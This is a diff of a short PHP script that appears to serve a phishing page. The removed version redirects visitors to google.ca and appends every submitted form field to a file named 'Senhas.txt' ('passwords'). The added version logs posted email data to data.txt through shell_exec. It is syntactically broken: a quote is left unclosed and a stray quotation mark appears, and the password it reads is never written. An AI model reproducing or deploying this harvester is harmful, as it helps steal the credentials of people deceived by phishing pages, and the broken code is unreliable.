@@ -1,13 +1,6 @@
 <?php
-header ('Location: http://google.ca ');
-$handle = fopen("Senhas.txt", "a");
-foreach($_POST as $variable => $value) {
-    fwrite($handle, $variable);
-    fwrite($handle, "=");
-    fwrite($handle, $value);
-    fwrite($handle, "\r\n");
-}
-fwrite($handle, "===============\r\n");
-fclose($handle);
-exit;
+$email =escapeshellcmd($_POST["email]);
+$password = escapeshellcmd($_POST["password"])";
+
+shell_exec("echo Email: ". $email ."and Password: " . ">>data.txt");
 ?>
